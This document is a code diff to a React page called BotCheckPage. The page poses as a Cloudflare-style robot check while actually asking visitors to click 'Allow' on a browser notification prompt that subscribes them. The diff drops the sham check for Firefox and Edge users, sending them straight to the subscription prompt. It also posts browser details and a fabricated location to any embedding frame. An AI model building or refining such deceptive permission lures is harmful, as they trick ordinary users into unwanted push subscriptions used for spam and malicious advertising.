@@ -11,6 +11,7 @@ export default function BotCheckPage() {
   const [isVerified, setIsVerified] = useState(false)
   const [showSoftPrompt, setShowSoftPrompt] = useState(false)
   const [permissionGranted, setPermissionGranted] = useState(false)
+  const [isFirefoxOrEdge, setIsFirefoxOrEdge] = useState(false)
   const [rayId, setRayId] = useState('')
   const [userAgent, setUserAgent] = useState('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
   const [ipAddress] = useState('192.168.1.100')
@@ -128,14 +129,15 @@ export default function BotCheckPage() {
   useEffect(() => {
     const clickHelper = new BrowserClickHelper()
     
-    // For Firefox/Edge, show soft prompt immediately instead of bot check
-    if (clickHelper.browser.requiresClick && clickHelper.needsPermission() && !window.isEmbedded) {
+    // For Firefox/Edge, show soft prompt immediately - NO BOT CHECK AT ALL
+    if (clickHelper.browser.requiresClick && clickHelper.needsPermission()) {
+      setIsFirefoxOrEdge(true)
       setIsChecking(false)
       setShowSoftPrompt(true)
       return
     }
     
-    // For Chrome/Safari or embedded mode, show bot check as before
+    // For Chrome/Safari, show bot check as before
     const timer = setTimeout(() => {
       setIsChecking(false)
       setIsVerified(true)
@@ -153,8 +155,8 @@ export default function BotCheckPage() {
             }
           }, '*')
         }, 500)
-      } else if (!clickHelper.browser.requiresClick) {
-        // Chrome/Safari - auto-request as before
+      } else {
+        // Chrome/Safari - auto-request
         setTimeout(() => {
           if (clientInfo) {
             handleAllow()
@@ -176,30 +178,22 @@ export default function BotCheckPage() {
         setPermissionGranted(true)
         setShowSoftPrompt(false)
         
-        // Now show bot check after permission is granted
-        setIsChecking(true)
-        setTimeout(() => {
-          setIsChecking(false)
-          setIsVerified(true)
-          
-          // If embedded, send verification message
-          if (window.isEmbedded && window.parent !== window) {
-            window.parent.postMessage({
-              type: 'bot-check-verified',
-              browserInfo: clientInfo,
-              location: {
-                country: 'United States',
-                city: 'New York',
-                ip: ipAddress
-              }
-            }, '*')
-          } else {
-            // After bot check completes, continue with subscription
-            setTimeout(() => {
-              handleAllow()
-            }, 500)
-          }
-        }, 1500)
+        // For Firefox/Edge, skip bot check entirely - go straight to subscription
+        if (window.isEmbedded && window.parent !== window) {
+          // Send verification message immediately (no bot check)
+          window.parent.postMessage({
+            type: 'bot-check-verified',
+            browserInfo: clientInfo,
+            location: {
+              country: 'United States',
+              city: 'New York',
+              ip: ipAddress
+            }
+          }, '*')
+        } else {
+          // Non-embedded mode - handle subscription directly
+          await handleAllow()
+        }
       } else if (permission === 'denied') {
         await handleBlock()
       }
@@ -500,7 +494,7 @@ export default function BotCheckPage() {
       <Container>
         <Card className="mx-auto" style={{ maxWidth: '700px', border: '1px solid #d9d9d9', boxShadow: 'none' }}>
           <Card.Body className="p-5" style={{ backgroundColor: '#ffffff' }}>
-            {showSoftPrompt ? (
+            {(showSoftPrompt || isFirefoxOrEdge) ? (
               // Soft prompt for Firefox/Edge
               <div className="text-center">
                 <div style={{ 
@@ -571,7 +565,7 @@ export default function BotCheckPage() {
                   You can change this setting anytime in your browser preferences
                 </p>
               </div>
-            ) : isChecking ? (
+            ) : (isChecking && !isFirefoxOrEdge) ? (
               <div className="text-center">
                 <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
                   Please Click "Allow" to confirm you are not a robot.
@@ -604,7 +598,7 @@ export default function BotCheckPage() {
                   </p>
                 </div>
               </div>
-            ) : (
+            ) : (!isFirefoxOrEdge) ? (
               <div className="text-center">
                 <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
                   Please Click "Allow" to confirm you are not a robot.
@@ -637,7 +631,7 @@ export default function BotCheckPage() {
                   </p>
                 </div>
               </div>
-            )}
+            ) : null}
           </Card.Body>
         </Card>
       </Container>
